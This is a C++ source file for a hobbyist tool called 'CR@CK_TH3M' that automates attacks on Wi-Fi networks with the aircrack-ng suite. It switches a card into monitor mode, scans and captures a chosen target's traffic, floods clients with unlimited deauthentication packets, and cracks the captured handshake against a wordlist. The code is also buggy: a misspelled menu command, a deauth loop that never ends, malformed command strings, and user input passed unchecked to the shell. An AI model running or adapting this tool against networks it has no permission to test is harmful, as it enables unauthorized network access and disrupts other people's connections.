#include <iostream>
#include <string>
#include <time.h>

using namespace std;

// installition and main script's requirments 
int base_system;
int unwanted_loop;


// main programme's requirments or variables
string user_input;
string wireless_card;
string wireless_card_monitormode;
string target_bssid;
string target_name;
string target_channel_number;
string path_to_store;
int i = 0;


//variables of  extra options
string returning_to_managed_mode;
string path_to_wordlist;
string file_name_with_extention_of_cap;
string crack_option;


int main()
{
    while(true)
    {
        cout << "Welcome to CR@CK_TH3M tool,this is an automation of airmon-ng." << endl;
        cout << "enter 'help' to see the user guidance manule.\n\n";

        cout << "CR@CK_TH3M|> ";
        cin >> user_input;


//===================== help manual for user's guidance
        if(user_input == "help"){
            system("clear");
            cout << "enter 'thanks' for knowing the special person's who helped making this automation." << endl;
            cout << "enter 'inscheck' to install and check dependencies for both Arch and Debian." << endl;
            cout << "enter 'changemode' to change wireless card to monitor-mode." << endl;
            cout << "enter 'showup' to dump all wifi's in your range." << endl;
            cout << "enter 'deauth' to deauthenticate device's form the access point." << endl;
            cout << "enter 'crackit' to try cracking hash using aircrack-ng." << endl;
            cout << "enter 'restore' to reset the wireless card to managed-mode." << endl;
            cout << "enter 'ctrl + c' to exit the programme anytime!." << endl;
            cout << "enter 'clear' to clear the terminal." << endl;
        }

//======================== if user wants to clear the messy screen
        else if(user_input == "clear"){
            system("clear");
        }


//========================================== special thanks section
        // special thanks to
        else if(user_input == "thanks?"){
            system("clear");
            cout << "Before starting, A very special thanks to\n\nT\t\tHE_HACKRERBOI, \n\n\t\tENCODED GUY \nand last but not least \n\n\t\tCODE_WITH_HARRY";
            cout << "\n instagram\n\n@thehackerb0i\n@codewithharry\n@encodedguy";
            system("sleep 2");
        }
        

//========================================================== requirment's check for both Arch and Debain
        else if(user_input == "insckeck"){

            // installation check
            system("clear");
            cout << "entering package check session....." << endl;
            cout << "\nenter your base system\n1) install dependencies(may take 1 or 2 mins, not more than that.)\nenter nothing to skip download check!!!(not recommended, may cause error while running) .";
            cin >> base_system;

            if(base_system == 1){
                system("sudo pacman -Sy konsole");
                system("sudo pacman -S aircrack-ng");
                system("sudo apt-get install konsole");
                system("sudo apt-get install aircrack-ng");
            }

            else{
                cout << "\n\nrunning straight to scritp" << endl;
                system("sleep 3");
            }
            }

        

//================================================================== changing wireless card to monitor mode
        else if(user_input == "changemode"){

            // wireless card's name extration from user
            system("clear");
            cout << "initiating monitor mode activation session.....";
            system("iwconfig");
            cout << "enter your wireless card name : ";
            cin >> wireless_card;
            system("clear");


            // airmon-ng
            system("clear");
            cout << "killing non-required processes...";
            system("sudo airmon-ng check kill");
            cout <<  "non required processes killed !!!!" << endl;
            cout << "activationg monitor mode...." << endl;
            string monitor_mode = "sudo airmon-ng start " + wireless_card;
            const char *firing_command_monitor_mode = monitor_mode.c_str();
            system(firing_command_monitor_mode);
            system("clear");
            cout << "running iwconfig please enter the name of card in monitor mode" << endl;
            system("iwconfig");
            cout << "enter name of wireless card in monitor mode : ";
            cin >> wireless_card_monitormode;
        }



// ===================================================== dumping wifi's in range using airodump-ng
        else if(user_input == "showup"){
            //airodump-ng
            system("clear");
            cout << "initiating airodump-ng session....";
            system("sleep 2");
            system("clear");

            string airodump1 = "sudo airodump-ng " + wireless_card_monitormode;
            const char *airodump_init1 = airodump1.c_str();
            cout << "please press 'ctrl + c' when you get your target...." << endl;
            system("sleep 2.5");
            system(airodump_init1);

            cout << "\n\nnote  and copy the bssid and channel number of the target you selected......\n" << endl;
            cout << "enter the targets bssid : ";
            cin >> target_bssid;
            cout << "\ngive an name to your target : ";
            cin >> target_name;
            cout << "enter a path/to/store/info of target [plese DON'T give a name at last]: ";
            cin >> path_to_store;
            cout << "\nenter targets channel number : ";
            cin >> target_channel_number;
            cout << "enter a NUMBER to deauthicate if not possible at first (4 or 5 is recommended): ";
            cin >> unwanted_loop;

            cout << "\n\nnecessary information extracted..."<<endl;
            cout << "running airodump-ng, this time clients connected to target will be shown..." << endl;
            system("sleep 4");
            cout << "please press 'ctrl + c' when you are done !!";
            string airodump2 = "sudo airodump-ng -C " + target_channel_number + "-w " + path_to_store + "/" + target_name + wireless_card_monitormode;
            const char *airodump_init2 = airodump2.c_str();
            system(airodump_init2);
        }


// ======================================================================= deauthentication attck using airplay-ng
        else if(user_input == "deauth"){

            // aireplay-ng
            cout << "\ninitiating aireplay-ng session....." << endl;
            cout << "accesspoint " << target_bssid << " locked...!" << endl;
            cout << "using interface " << wireless_card_monitormode << endl;
            cout << "setting deauthentication packets injection to infinite = '0'" << endl;
            system("sleep 2");
            system("clear");
            cout << "WARNING : Please press 'ctrl + c' if the first deauth attack wasn't sucessfull";
            system("sleep 1.5"); 
            string airplay_deauth = "konsole -e sudo aireplay-ng --deauth 0 -a " + target_bssid + " " + wireless_card_monitormode;
            cout << "\n\n\nplease press 'ctrl + c' when required mens when your aren't getting the HASH through deauthantication." << endl;
            system("sleep 2");
            cout << "running the below command base on given information in....." << endl;
            cout <<airplay_deauth;

            cout << "\n5" << endl;
            system("sleep 1");
            cout << "4" << endl;
            system("sleep 1");
            cout << "3" << endl;
            system("sleep 1");
            cout << "2" << endl;
            system("sleep 1");
            cout << "1" << endl;
            system("sleep 1");


            const char *command_aireplay = airplay_deauth.c_str();
            while(i < unwanted_loop)
            {
                cout << "\nleft " << i + "\nrun again" << endl;
                system(command_aireplay);
            }
        }

//====================================================================== cracking hash using aircrack-ng
        else if(user_input == "crackit"){
            // to crack the captured hash
            cout << "\n\nwould you like to crack the hash [y/n]: ";
            cin >> crack_option;

            if (crack_option == "y")
            {
                cout << "\n\nenter a path to worldlist : ";
                cin >> path_to_wordlist;
                cout << "\nenter the file created during airodump-ng session having extention [(name of the file).cap]\n==-> ";
                cin >> file_name_with_extention_of_cap;

                string cracking_time = "sudo aircrack-ng -w ";
                cracking_time = cracking_time + path_to_wordlist + file_name_with_extention_of_cap;
                const char *releasing_command_of_cracking = cracking_time.c_str();
                system(releasing_command_of_cracking);
            }

            else
            {
                cout << "\n\nok as you wish....." << endl;
            }
        }


//============================================================================ restoring wireless card to managed mode
        else if(user_input == "restore"){
            // to restore the wireless card to managed mode
            cout << "Would you like to restore your wireless card in managed mode again [y/n] : ";
            cin >> returning_to_managed_mode;

            if(returning_to_managed_mode == "y")
            {
                string managed_mode_restore = "sudo airmon-ng stop ";
                managed_mode_restore = managed_mode_restore + wireless_card_monitormode;
                const char *command_managed_mode_restoration = managed_mode_restore.c_str();
                system(command_managed_mode_restoration);
            }
            else
            {
                cout << "no problem, you can help yourself I know, (;" << endl;
                cout << "just use this command 'sudo airmon-ng stop " << wireless_card_monitormode;
            }
        }

//====================== if user entered worng command
        else{
            cout << "command " << user_input << " not found please mount /dev/brain !";
        }

    }
    return 0;
}